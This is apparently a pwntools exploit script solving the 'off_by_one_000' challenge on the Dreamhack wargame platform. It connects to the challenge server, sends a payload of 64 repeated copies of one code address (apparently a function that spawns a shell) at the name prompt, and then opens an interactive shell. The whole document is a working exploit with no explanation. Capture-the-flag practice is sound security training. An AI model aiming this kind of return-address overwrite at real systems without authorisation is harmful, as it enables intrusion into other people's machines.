from pwn import *

p = remote("host1.dreamhack.games", 16348)
elf = ELF("./off_by_one_000/off_by_one_000")


payload = p32(0x080485db) * 64

p.recvuntil("Name: ")
p.send(payload)

p.interactive()
